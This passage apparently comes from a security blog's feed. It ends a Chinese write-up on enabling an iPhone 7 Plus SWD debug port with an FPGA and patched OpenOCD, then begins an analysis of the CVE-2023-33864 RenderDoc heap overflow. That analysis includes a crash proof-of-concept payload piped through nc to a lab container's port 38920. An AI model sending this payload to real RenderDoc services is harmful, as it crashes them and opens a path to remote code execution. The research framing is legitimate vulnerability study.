<span class="n">set_property</span> <span class="n">PULLDOWN</span> <span class="n">TRUE</span> <span class="p">[</span><span class="n">get_ports</span> <span class="o">{</span><span class="n">swclk</span><span class="o">}</span><span class="p">]</span>          
<span class="n">set_property</span> <span class="n">PULLDOWN_RESISTOR</span> <span class="mi">20</span><span class="n">K</span> <span class="p">[</span><span class="n">get_ports</span> <span class="o">{</span><span class="n">swclk</span><span class="o">}</span><span class="p">]</span>
</code></pre></div></div>

<p>发送 “75 A0 00 00 00 00 00 40” 序列的模块，定义了一个 8 比特的发送缓冲区 byte[7:0]，</p>

<p>若检测到两次 break 信号，send_en 标志位会置位，激活序列发送模块，</p>

<p>单字节发送完毕后，tx_done 标志位置位表示可以发送下一个字节，同时 tx_cnt 计数器递增 1，数据都是硬编码的，</p>

<p>序列发送完毕后，send_success 标志位置位，该标志位会传递到父模块的 send_done ，导致 acc 引脚状态的切换。</p>

<div class="language-verilog highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// 发送序列 75 a0 00 00 00 00 00 40</span>
<span class="k">always</span> <span class="o">@</span><span class="p">(</span><span class="kt">posedge</span> <span class="n">sys_clk</span> <span class="kt">or</span> <span class="kt">negedge</span> <span class="n">rst</span><span class="p">)</span> <span class="k">begin</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">rst</span><span class="p">)</span> <span class="k">begin</span>
        <span class="kt">byte</span> <span class="o">&lt;=</span> <span class="mi">8'd0</span><span class="p">;</span>                         <span class="c1">// byte[7:0], 8 比特的发送缓冲</span>
        <span class="n">tx_en</span> <span class="o">&lt;=</span> <span class="mb">1'b0</span><span class="p">;</span>                        <span class="c1">// tx_en, 当前字节发送使能标志位</span>
        <span class="n">send_success</span> <span class="o">&lt;=</span> <span class="mb">1'b0</span><span class="p">;</span>                 <span class="c1">// send_success, 序列发送完毕标志位</span>
    <span class="k">end</span>
    <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">send_success</span> <span class="o">&amp;&amp;</span> <span class="n">send_en</span><span class="p">)</span> <span class="k">begin</span>
        <span class="k">case</span><span class="p">(</span><span class="n">tx_cnt</span><span class="p">)</span>
            <span class="mi">3'd0</span><span class="o">:</span> <span class="k">begin</span>
                <span class="kt">byte</span> <span class="o">&lt;=</span> <span class="mh">8'h75</span><span class="p">;</span>                <span class="c1">// 发送缓冲区写入 0x75</span>
                <span class="k">if</span><span class="p">(</span><span class="n">tx_done</span><span class="p">)</span>
                    <span class="n">tx_en</span> <span class="o">&lt;=</span> <span class="mb">1'b0</span><span class="p">;</span>
                <span class="k">else</span>
                    <span class="n">tx_en</span> <span class="o">&lt;=</span> <span class="mb">1'b1</span><span class="p">;</span>
            <span class="k">end</span>
            <span class="mi">3'd1</span><span class="o">:</span> <span class="k">begin</span>
                <span class="kt">byte</span> <span class="o">&lt;=</span> <span class="mh">8'ha0</span><span class="p">;</span>                <span class="c1">// 发送缓冲区写入 0xa0</span>
                <span class="k">if</span><span class="p">(</span><span class="n">tx_done</span><span class="p">)</span>
                    <span class="n">tx_en</span> <span class="o">&lt;=</span> <span class="mb">1'b0</span><span class="p">;</span>
                <span class="k">else</span>
                    <span class="n">tx_en</span> <span class="o">&lt;=</span> <span class="mb">1'b1</span><span class="p">;</span>
            <span class="k">end</span>
            <span class="mi">3'd2</span><span class="o">:</span> <span class="k">begin</span>
                <span class="kt">byte</span> <span class="o">&lt;=</span> <span class="mh">8'h00</span><span class="p">;</span>                <span class="c1">// 发送缓冲区写入 0x00</span>
                <span class="k">if</span><span class="p">(</span><span class="n">tx_done</span><span class="p">)</span>
                    <span class="n">tx_en</span> <span class="o">&lt;=</span> <span class="mb">1'b0</span><span class="p">;</span>
                <span class="k">else</span>
                    <span class="n">tx_en</span> <span class="o">&lt;=</span> <span class="mb">1'b1</span><span class="p">;</span>
            <span class="k">end</span>
            <span class="mi">3'd3</span><span class="o">:</span> <span class="k">begin</span>
                <span class="kt">byte</span> <span class="o">&lt;=</span> <span class="mh">8'h00</span><span class="p">;</span>                <span class="c1">// 发送缓冲区写入 0x00</span>
                <span class="k">if</span><span class="p">(</span><span class="n">tx_done</span><span class="p">)</span>
                    <span class="n">tx_en</span> <span class="o">&lt;=</span> <span class="mb">1'b0</span><span class="p">;</span>
                <span class="k">else</span>
                    <span class="n">tx_en</span> <span class="o">&lt;=</span> <span class="mb">1'b1</span><span class="p">;</span>
            <span class="k">end</span>
            <span class="mi">3'd4</span><span class="o">:</span> <span class="k">begin</span>
                <span class="kt">byte</span> <span class="o">&lt;=</span> <span class="mh">8'h00</span><span class="p">;</span>                <span class="c1">// 发送缓冲区写入 0x00</span>
                <span class="k">if</span><span class="p">(</span><span class="n">tx_done</span><span class="p">)</span>
                    <span class="n">tx_en</span> <span class="o">&lt;=</span> <span class="mb">1'b0</span><span class="p">;</span>
                <span class="k">else</span>
                    <span class="n">tx_en</span> <span class="o">&lt;=</span> <span class="mb">1'b1</span><span class="p">;</span>
            <span class="k">end</span>
            <span class="mi">3'd5</span><span class="o">:</span> <span class="k">begin</span>
                <span class="kt">byte</span> <span class="o">&lt;=</span> <span class="mh">8'h00</span><span class="p">;</span>                <span class="c1">// 发送缓冲区写入 0x00</span>
                <span class="k">if</span><span class="p">(</span><span class="n">tx_done</span><span class="p">)</span>
                    <span class="n">tx_en</span> <span class="o">&lt;=</span> <span class="mb">1'b0</span><span class="p">;</span>
                <span class="k">else</span>
                    <span class="n">tx_en</span> <span class="o">&lt;=</span> <span class="mb">1'b1</span><span class="p">;</span>
            <span class="k">end</span>
            <span class="mi">3'd6</span><span class="o">:</span> <span class="k">begin</span>
                <span class="kt">byte</span> <span class="o">&lt;=</span> <span class="mh">8'h00</span><span class="p">;</span>                <span class="c1">// 发送缓冲区写入 0x00</span>
                <span class="k">if</span><span class="p">(</span><span class="n">tx_done</span><span class="p">)</span>
                    <span class="n">tx_en</span> <span class="o">&lt;=</span> <span class="mb">1'b0</span><span class="p">;</span>
                <span class="k">else</span>
                    <span class="n">tx_en</span> <span class="o">&lt;=</span> <span class="mb">1'b1</span><span class="p">;</span>
            <span class="k">end</span>
            <span class="mi">3'd7</span><span class="o">:</span> <span class="k">begin</span>                       <span class="c1">// 发送缓冲区写入 crc-8 校验码 0x40</span>
                <span class="kt">byte</span> <span class="o">&lt;=</span> <span class="mh">8'h40</span><span class="p">;</span>
                <span class="k">if</span><span class="p">(</span><span class="n">tx_done</span><span class="p">)</span> <span class="k">begin</span>
                    <span class="n">tx_en</span> <span class="o">&lt;=</span> <span class="mb">1'b0</span><span class="p">;</span>
                    <span class="n">send_success</span> <span class="o">&lt;=</span> <span class="mb">1'b1</span><span class="p">;</span> <span class="c1">// 序列 75 a0 00 00 00 00 00 40 发送完成，发送成功标志位置1</span>
                <span class="k">end</span>
                <span class="k">else</span>
                    <span class="n">tx_en</span> <span class="o">&lt;=</span> <span class="mb">1'b1</span><span class="p">;</span>
            <span class="k">end</span>
            <span class="nl">default:</span> <span class="k">begin</span>
                <span class="kt">byte</span> <span class="o">&lt;=</span> <span class="mi">8'd0</span><span class="p">;</span>
                <span class="n">tx_en</span> <span class="o">&lt;=</span> <span class="mb">1'b0</span><span class="p">;</span>
                <span class="n">send_success</span> <span class="o">&lt;=</span> <span class="mb">1'b0</span><span class="p">;</span>
            <span class="k">end</span>
        <span class="k">endcase</span>
    <span class="k">end</span>
    <span class="k">else</span>
        <span class="n">tx_en</span> <span class="o">&lt;=</span> <span class="mb">1'b0</span><span class="p">;</span>                  <span class="c1">// 发送成功标志位置1后，发送使能拉低</span>
<span class="k">end</span>
</code></pre></div></div>

<h3 id="jlink--openocd-调试原理">jlink + OpenOCD 调试原理</h3>

<p>jlink 调试器连接目标设备和上位机，在上位机命令行启动 openocd 之后，openocd 连接到 jlink 调试器，同时在本地 3333 端口开启监听。</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo</span> ./openocd <span class="nt">-f</span> t8010.cfg <span class="nt">-s</span> ../tcl/ <span class="nt">-d3</span>
</code></pre></div></div>

<p>使用 gdb 连接到 3333 端口，上位机与目标设备建立调试链路。</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gdb-multiarch <span class="nt">-ex</span> <span class="s2">"target remote localhost:3333"</span>
</code></pre></div></div>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/iPhone_SWD%E8%B0%83%E8%AF%95%E5%99%A8-%E7%AC%AC_16_%E9%A1%B5.jpg" alt="iPhone SWD调试器-第 16 页.jpg" /></p>

<p>OpenOCD 的作用是，接收来自 gdb 的调试语句，翻译成符合《ARM Debug Interface Architecture Specification》规范的请求，通过 USB 发送给 jlink 调试器。</p>

<p>例如一条 gdb 调试语句 “ info reg ” 可以被翻译成多条对硬件调试寄存器访问的低级语义的语句，这在 ADI 中被称为 DPACC 和 APACC。</p>

<p>jlink 调试器使用固件方案实现了 ADI 中定义的 SWD 协议。</p>

<p>jlink 调试器接到 OpenOCD 请求后，转化为 SWCLK 和 SWDIO 引脚上的电平变化发送到目标设备。</p>

<p>间隔 Trn 个时钟周期之后，jlink 调试器采样 SWDIO 引脚的信号，解析为 ACK，根据 ACK 判断请求的执行结果。</p>

<p>若目标设备成功执行了请求，则 jlink 间隔 Trn 个时钟周期后向目标设备发送数据，或者从目标设备读取数据。</p>

<p>jlink 把读取到的数据和 ACK 返回给 OpenOCD，OpenOCD 把数据整合后，通过本地 3333 端口返回给 gdb 显示给用户。</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/EF3A852C-B563-48F7-BBBE-36BD0E8BF22A.png" alt="{EF3A852C-B563-48F7-BBBE-36BD0E8BF22A}.png" /></p>

<h3 id="修改-openocd-源代码">修改 OpenOCD 源代码</h3>

<p>如果不对 OpenOCD 修改而直接使用，会出现如下报错：</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/iPhone_SWD%E8%B0%83%E8%AF%95%E5%99%A8-%E7%AC%AC_20_%E9%A1%B5.jpg" alt="iPhone SWD调试器-第 20 页.jpg" /></p>

<p>第一条对 AP 访问指令还没有完成，导致第二条对 DP 访问的指令出现了 WAIT，但是 jlink 调试器还是继续提交第三条 AP 访问，导致从第三条 AP 访问开始出现错误。</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/iPhone_SWD%E8%B0%83%E8%AF%95%E5%99%A8-%E7%AC%AC_19_%E9%A1%B5.jpg" alt="iPhone SWD调试器-第 19 页.jpg" /></p>

<p>ACK 字段是目标设备对请求的执行结果：</p>

<ul>
  <li>OK：执行成功，对于写操作可以在 Trn 个时钟周期后传输 WDATA 部分，对于读操作可以在 Trn 个时钟周期后读取 WDATA；</li>
  <li>WAIT：前一条请求还在执行中，本轮操作还需等待；</li>
  <li>FAULT：发生错误。</li>
</ul>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/65FE6B35-A16D-4363-A117-F40710051C18.png" alt="{65FE6B35-A16D-4363-A117-F40710051C18}.png" /></p>

<p>由于 jlink 固件尚未开源，我们无从知晓 jlink 调试器是如何处理这些 ACK 响应的。</p>

<p>但是根据逻辑分析仪抓包和 OpenOCD 源码、调试日志的分析可知，</p>

<p>jlink 调试器本身并不知道如何应对 OK 、 WAIT 、 FAULT 这些响应，它只是如实采集并转发 ACK 和 WDATA 给 OpenOCD，由  OpenOCD 来定夺如何处理每一条结果。</p>

<p>当返回 WAIT 的时候，按照正常的逻辑应该等待若干时钟周期之后再重新向目标设备发送一次请求，确保前一次请求已经执行完毕，但是 OpenOCD 处理 WAIT 的逻辑和处理 FAULT 是一样的，都是直接丢弃结果并返回错误代码。</p>

<p>jlink_swd_run_queue 函数向 jlink 调试器提交请求，接收来自 jlink 调试器的 ACK 和 WDATA。</p>

<p>✅当 ACK ==  OK 时， OpenOCD 把 WDATA 传递给 gdb 显示给用户；</p>

<p>❌当返回 ACK == WAIT 或 FAULT 时， 打印调试器信息并把 ACK 值返回给 jlink_swd_queue_cmd 。</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/iPhone_SWD%E8%B0%83%E8%AF%95%E5%99%A8-%E7%AC%AC_17_%E9%A1%B5.jpg" alt="iPhone SWD调试器-第 17 页.jpg" /></p>

<p>gdb 调试语句翻译过来的 DPACC 和 APACC 命令，由 jlink_swd_queue_cmd 函数加入请求队列，若队列已满，则调用 jlink_swd_run_queue 函数提交给 jlink 调试器执行。</p>

<p>若 jlink 返回的结果中 ACK != OK ，则 jlink_swd_queue_cmd 函数返回，不再继续处理后续的 DPACC 和 APACC 命令。</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/iPhone_SWD%E8%B0%83%E8%AF%95%E5%99%A8-%E7%AC%AC_18_%E9%A1%B5.jpg" alt="iPhone SWD调试器-第 18 页.jpg" /></p>

<p>OpenOCD 默认的处理逻辑是，对 ACK == WAIT 的结果视同为 ACK == FAULT ，直接丢弃。这就要求用户正确编写配置文件，尤其是通信频率要合适，电缆的长度不能过长，以防止 jlink 调试器采样过程出现错误。</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/iPhone_SWD%E8%B0%83%E8%AF%95%E5%99%A8-%E7%AC%AC_22_%E9%A1%B5.jpg" alt="iPhone SWD调试器-第 22 页.jpg" /></p>

<p>但是降低通信频率会导致 SWD 协议信号意外的与 SDQ 中的复位序列重合，导致 lighting 电路复位，无法进入 SWD 调试。</p>

<p>我们的做法是加大 APACC 调试指令后的等待时间，确保目标设备有足够的时间执行 APACC 指令。</p>

<p>OpenOCD 默认等待时间是10个时钟周期，经过我们的多次实验发现，等待 128 个时钟周期能够确保上一条 APACC 指令执行完毕。</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2025-08-28_103216.png" alt="屏幕截图 2025-08-28 103216.png" /></p>

<p>观察对比发现，等待 128 个时钟周期能够很好的确保上一条 APACC 指令执行完毕。</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/iPhone_SWD%E8%B0%83%E8%AF%95%E5%99%A8-%E7%AC%AC_21_%E9%A1%B5.jpg" alt="iPhone SWD调试器-第 21 页.jpg" /></p>

<h3 id="编译-openocd-源代码">编译 OpenOCD 源代码</h3>

<p>步骤一：安装必要的依赖</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>apt <span class="nb">install </span>make libtool pkg-config autoconf automake texinfo
</code></pre></div></div>

<p>步骤二：编译 openocd</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>git clone https://github.com/stacksmashing/openocd.git
<span class="nv">$ </span>./bootstrap   <span class="c"># 通过git clone下载需要这个步骤</span>
<span class="nv">$ </span>./configure <span class="nt">--enable-jlink</span><span class="o">=</span><span class="nb">yes</span>  <span class="c"># 使能 jlink 调试器</span>
<span class="nv">$ </span>make <span class="nt">-j</span>
</code></pre></div></div>

<p>编译完成后，在 src 目录下即可看到 openocd 可执行文件</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/E7A65551-FD7A-48DB-86BF-D874DB3DF175.png" alt="{E7A65551-FD7A-48DB-86BF-D874DB3DF175}.png" /></p>

<h3 id="openocd-配置文件">OpenOCD 配置文件</h3>

<p>该配置文件修改自 Bonobo Cable 的配置文件：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>interface jlink              <span class="c"># 使用 jlink 调试器</span>
transport <span class="k">select </span>swd         <span class="c"># swd 调试协议</span>
adapter_khz 3000             <span class="c"># 通信频率 3000khz</span>

reset_config srst_only

<span class="nb">source</span> <span class="o">[</span>find target/swj-dp.tcl]

<span class="k">if</span> <span class="o">{</span> <span class="o">[</span>info exists CHIPNAME] <span class="o">}</span> <span class="o">{</span>
   <span class="nb">set </span>_CHIPNAME <span class="nv">$CHIPNAME</span>
<span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
   <span class="nb">set </span>_CHIPNAME iphone
<span class="o">}</span>

<span class="k">if</span> <span class="o">{</span> <span class="o">[</span>info exists ENDIAN] <span class="o">}</span> <span class="o">{</span>
   <span class="nb">set </span>_ENDIAN <span class="nv">$ENDIAN</span>
<span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
   <span class="nb">set </span>_ENDIAN little
<span class="o">}</span>

<span class="k">if</span> <span class="o">{</span> <span class="o">[</span>info exists CPUTAPID] <span class="o">}</span> <span class="o">{</span>
   <span class="nb">set </span>_CPUTAPID <span class="nv">$CPUTAPID</span>
<span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
   <span class="k">if</span> <span class="o">{</span> <span class="o">[</span>using_jtag] <span class="o">}</span> <span class="o">{</span>
      <span class="nb">set </span>_CPUTAPID 0x4ba02477
   <span class="o">}</span> <span class="o">{</span>
      <span class="c"># SWD IDCODE</span>
      <span class="nb">set </span>_CPUTAPID 0x4ba02477
   <span class="o">}</span>
<span class="o">}</span>
swj_newdap <span class="nv">$_CHIPNAME</span> cpu <span class="nt">-irlen</span> 6 <span class="nt">-ircapture</span> 0x1 <span class="nt">-irmask</span> 0xf <span class="nt">-expected-id</span> <span class="nv">$_CPUTAPID</span>
dap create <span class="nv">$_CHIPNAME</span>.dap <span class="nt">-chain-position</span> <span class="nv">$_CHIPNAME</span>.cpu

<span class="c"># MEM-AP</span>
target create <span class="nv">$_CHIPNAME</span>.dbg mem_ap <span class="nt">-endian</span> <span class="nv">$_ENDIAN</span> <span class="nt">-dap</span> <span class="nv">$_CHIPNAME</span>.dap <span class="nt">-ap-num</span> 1
target create <span class="nv">$_CHIPNAME</span>.mem mem_ap <span class="nt">-endian</span> <span class="nv">$_ENDIAN</span> <span class="nt">-dap</span> <span class="nv">$_CHIPNAME</span>.dap <span class="nt">-ap-num</span> 4

<span class="c"># CPU0</span>
cti create <span class="nv">$_CHIPNAME</span>.cpu0.cti <span class="nt">-dap</span> <span class="nv">$_CHIPNAME</span>.dap <span class="nt">-ap-num</span> 1 <span class="nt">-ctibase</span> 0xc2020000
target create <span class="nv">$_CHIPNAME</span>.cpu0 aarch64 <span class="nt">-endian</span> <span class="nv">$_ENDIAN</span> <span class="nt">-dap</span> <span class="nv">$_CHIPNAME</span>.dap <span class="nt">-ap-num</span> 1 <span class="nt">-dbgbase</span> 0xc2010000 <span class="nt">-cti</span> <span class="nv">$_CHIPNAME</span>.cpu0.cti <span class="nt">-coreid</span> 0 <span class="nt">-apple-utt</span> 4 0x202040000 64

<span class="c"># CPU1</span>
cti create <span class="nv">$_CHIPNAME</span>.cpu1.cti <span class="nt">-dap</span> <span class="nv">$_CHIPNAME</span>.dap <span class="nt">-ap-num</span> 1 <span class="nt">-ctibase</span> 0xc2120000
target create <span class="nv">$_CHIPNAME</span>.cpu1 aarch64 <span class="nt">-endian</span> <span class="nv">$_ENDIAN</span> <span class="nt">-dap</span> <span class="nv">$_CHIPNAME</span>.dap <span class="nt">-ap-num</span> 1 <span class="nt">-dbgbase</span> 0xc2110000 <span class="nt">-cti</span> <span class="nv">$_CHIPNAME</span>.cpu1.cti <span class="nt">-coreid</span> 1 <span class="nt">-apple-utt</span> 4 0x202140000 64

<span class="c"># SMP</span>
target smp <span class="nv">$_CHIPNAME</span>.cpu0 <span class="nv">$_CHIPNAME</span>.cpu1

<span class="c"># SEP</span>
target create <span class="nv">$_CHIPNAME</span>.sep cortex_a <span class="nt">-endian</span> <span class="nv">$_ENDIAN</span> <span class="nt">-dap</span> <span class="nv">$_CHIPNAME</span>.dap <span class="nt">-ap-num</span> 1 <span class="nt">-dbgbase</span> 0xcda20000

init
</code></pre></div></div>

<h2 id="使用演示">使用演示</h2>

<p><a href="https://www.bilibili.com/video/BV1D2e1z7Eb1?vd_source=cb167874159c7e114d4cd5fd0c4a9ce3">iPhone 7 plus 开启 SWD调试端口的 FPGA 实现方案_哔哩哔哩_bilibili</a></p>

<p>验证第一段代码：</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/iPhone_SWD%E8%B0%83%E8%AF%95%E5%99%A8-%E7%AC%AC_23_%E9%A1%B5.jpg" alt="iPhone SWD调试器-第 23 页.jpg" /></p>

<p>验证字符串：</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/iPhone_SWD%E8%B0%83%E8%AF%95%E5%99%A8-%E7%AC%AC_24_%E9%A1%B5.jpg" alt="iPhone SWD调试器-第 24 页.jpg" /></p>]]></content><author><name></name></author><category term="hardware" /><summary type="html"><![CDATA[PANDA 2025 安全大会上，我们在 iPhone 7 plus 上面成功启动 Linux 内核，我们继续探索苹果手机硬件安全，并于近日成功打开了 iPhone 7 plus 的 SWD 硬件调试端口。]]></summary></entry><entry><title type="html">CVE-2023-33864 RenderDoc堆溢出漏洞分析</title><link href="http://localhost:4000/userspace/2025/05/27/CVE-2023-33864-RenderDoc%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html" rel="alternate" type="text/html" title="CVE-2023-33864 RenderDoc堆溢出漏洞分析" /><published>2025-05-27T13:27:38+08:00</published><updated>2025-05-27T13:27:38+08:00</updated><id>http://localhost:4000/userspace/2025/05/27/CVE-2023-33864-RenderDoc%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90</id><content type="html" xml:base="http://localhost:4000/userspace/2025/05/27/CVE-2023-33864-RenderDoc%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html"><![CDATA[<p>RenderDoc 是一款开源的图形调试工具，主要用于实时捕获、分析和调试 OpenGL 和 OpenGL ES 等图形 API 的渲染过程。它被广泛应用于 游戏开发、图形引擎优化、GPU 驱动问题排查等领域，支持 Windows、Linux 和 Android 平台。</p>

<h1 id="漏洞信息">漏洞信息</h1>

<h2 id="目标信息">目标信息</h2>

<p>CVE-2023-33864 是 renderdoc 软件的整数溢出导致的堆溢出漏洞，漏洞存在于1.27版本之前的renderdoc中，可以使攻击者绕过系统的地址随机化保护，实现远程任意代码执行。</p>

<p>RenderDoc 是一款开源的图形调试工具，主要用于实时捕获、分析和调试 OpenGL 和 OpenGL ES 等图形 API 的渲染过程。它被广泛应用于 游戏开发、图形引擎优化、GPU 驱动问题排查等领域，支持 Windows、Linux 和 Android 平台。</p>

<p>RenderDoc 是CS架构，分为两部分，一部分是图形化的调试界面，作为client使用；另一部分是调试服务作为server端使用。</p>

<p>服务端以 librenderdoc.so 的形式向 client 提供调试服务。</p>

<p>client 既可以从本地加载 <a href="http://libcrenderdoc.so">libcrenderdoc.so</a>，调用其中的API，进行本地调试；</p>

<p>client 又可以从远程通过 38920 tcp 端口连接到 <a href="http://libcrenderdoc.so">libcrenderdoc.so</a> ，进行远程调试；</p>

<p>所以漏洞出现在 librenderdoc.so 的 TCP 服务部分。</p>

<p><a href="http://librenderdoc.so">librenderdoc.so</a> 在被 ld 链接器加载的过程中，会执行自身的初始化函数，在初始化的时候会起一个 TCP 监听端口 38920，接收远程的调试请求。</p>

<h2 id="漏洞信息-1">漏洞信息</h2>

<p><a href="https://www.qualys.com/2023/06/06/renderdoc/renderdoc.txt">www.qualys.com</a></p>

<p>漏洞存在的位置是renderdoc私有的远程调试协议，该协议基于TCP协议。</p>

<p>当client向server请求建立调试的过程中，client首先向server发送表明自身身份的标识“client name”，server在处理“client name”的时候发生了整数溢出，进而造成了堆溢出。</p>

<p>漏洞能力：</p>

<ol>
  <li>任意长度的堆溢出；</li>
  <li>溢出内容攻击者完全可控；</li>
  <li>没有 NULL 字符截断；</li>
</ol>

<p>漏洞技巧：</p>

<p>House-of-Muney-Heap-Exploitation</p>

<p><a href="http://tukan.farm/2016/07/27/munmap-madness/">munmap madness · Online tukan sanctuary</a></p>

<h2 id="我们的工作">我们的工作</h2>

<p>该漏洞由 Qualys 团队发现，该团队提出了漏洞利用思路，但是没有公开漏洞利用代码。</p>

<p>我们开发出了漏洞EXP，该EXP可以实现稳定的利用，在 libc-2.31 环境下完成了测试。</p>

<h1 id="环境搭建">环境搭建</h1>

<p>源码下载：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>git clone https://github.com/baldurk/renderdoc.git
<span class="nv">$ </span><span class="nb">cd </span>renderdoc
<span class="nv">$ </span>git tag
<span class="nv">$ </span>git checkout v1.26
</code></pre></div></div>

<p>库文件安装：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>apt <span class="nb">install </span>libx11-6 libx11-dev libxcb1 libxcb1-dev <span class="se">\</span>
    libxcb-keysyms1 libxcb-keysyms1-dev <span class="se">\ </span>   
    mesa-common-dev libgl1-mesa-dev <span class="se">\ </span>   
    libpcre3-dev qt5-qmake python3-dev 
</code></pre></div></div>

<p>源码编译：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cd </span>renderdoc
<span class="nv">$ </span>cmake <span class="nt">-DCMAKE_BUILD_TYPE</span><span class="o">=</span>Debug <span class="nt">-Bbuild</span> <span class="nt">-H</span><span class="nb">.</span>
<span class="nv">$ </span>make <span class="nt">-C</span> build
</code></pre></div></div>

<h1 id="漏洞复现">漏洞复现</h1>

<h2 id="开启librenderdoc服务">开启librenderdoc服务</h2>

<p>载入librenderdoc.so动态链接库并调用strace进行系统调用跟踪：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nb">test</span>@530ebd686b7d:/test<span class="nv">$ </span>strace <span class="nt">-f</span> <span class="nt">-o</span> strace.out <span class="nt">-E</span> <span class="nv">LD_PRELOAD</span><span class="o">=</span>/your/real/path/librenderdoc.so <span class="nb">sleep </span>600
</code></pre></div></div>

<ul>
  <li>strace：Linux 系统调用追踪工具，用于监控进程与内核的交互（如文件操作、进程管理等）。
    <ul>
      <li>-f：追踪子进程（fork/clone 创建的进程）。</li>
      <li>-o strace.out：将输出保存到文件 strace.out。</li>
      <li>-E LD_PRELOAD=/your/real/path/librenderdoc.so：设置环境变量 LD_PRELOAD（仅对 strace 启动的进程生效）。</li>
    </ul>
  </li>
  <li>sleep 600：被追踪的目标进程（休眠600秒）。</li>
</ul>

<p>可以看到本地打开了38920监听端口，docker端地址为172.17.0.2，server的线程号为2991：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">test</span>@530ebd686b7d:/test<span class="nv">$ </span>netstat <span class="nt">-ltup</span>
Active Internet connections <span class="o">(</span>only servers<span class="o">)</span>
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:38920           0.0.0.0:<span class="k">*</span>               LISTEN      2811/sleep 
<span class="nb">test</span>@530ebd686b7d:<span class="nv">$ </span>ifconfig
eth0: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
        inet6 fda0:123d:b02a::2  prefixlen 64  scopeid 0x0&lt;global&gt;
        inet6 fe80::fc90:fbff:fe2c:f71e  prefixlen 64  scopeid 0x20&lt;<span class="nb">link</span><span class="o">&gt;</span>
        ether fe:90:fb:2c:f7:1e  txqueuelen 0  <span class="o">(</span>Ethernet<span class="o">)</span>
        RX packets 7460  bytes 30911657 <span class="o">(</span>30.9 MB<span class="o">)</span>
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3399  bytes 201607 <span class="o">(</span>201.6 KB<span class="o">)</span>
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
<span class="nb">test</span>@530ebd686b7d:/test<span class="nv">$ </span>ps <span class="nt">-eLf</span>
UID          PID    PPID     LWP  C NLWP STIME TTY          TIME CMD
....
<span class="nb">test        </span>2989    2914    2989  0    2 09:09 pts/2    00:00:00 /usr/bin/sleep 6000
<span class="nb">test        </span>2989    2914    2991  0    2 09:09 pts/2    00:00:00 /usr/bin/sleep 6000
<span class="nb">test        </span>2992    2971    2992  0    1 09:09 pts/6    00:00:00 ps <span class="nt">-eLf</span>
</code></pre></div></div>

<p>载入librenderdoc.so动态链接库时会开启tcp服务端，监听38920端口。</p>

<h2 id="宿主机模拟远程攻击">宿主机模拟远程攻击</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="o">(</span>
  <span class="nb">printf</span> <span class="s1">'\2\0\0\0\0\0\0\0\1\0\0\0\x80\x00\xa0\x00%010485760x'</span> 1<span class="p">;</span>   <span class="c"># 第一部分：构造头部+填充数据</span>
  <span class="nb">sleep </span>3<span class="p">;</span>                                                          <span class="c"># 延迟3秒</span>
  <span class="nb">printf</span> <span class="s1">'%0128x%04096x'</span> 1 1                                        <span class="c"># 第二部分：附加填充数据</span>
<span class="o">)</span> | nc <span class="nt">-nv</span> 172.17.0.2 38920                                         <span class="c"># 发送到目标端口</span>
</code></pre></div></div>

<p>可以看到docker端的服务已经被打崩：</p>

<p><img src="/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/%E6%89%B9%E6%B3%A8_2025-05-13_155029.png" alt="批注 2025-05-13 155029.png" /></p>

<p>检查strace的输出：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2847  recvfrom<span class="o">(</span>5, <span class="s2">"00000000000000000000000000000000"</span>..., 128, 0, NULL, NULL<span class="o">)</span> <span class="o">=</span> 128
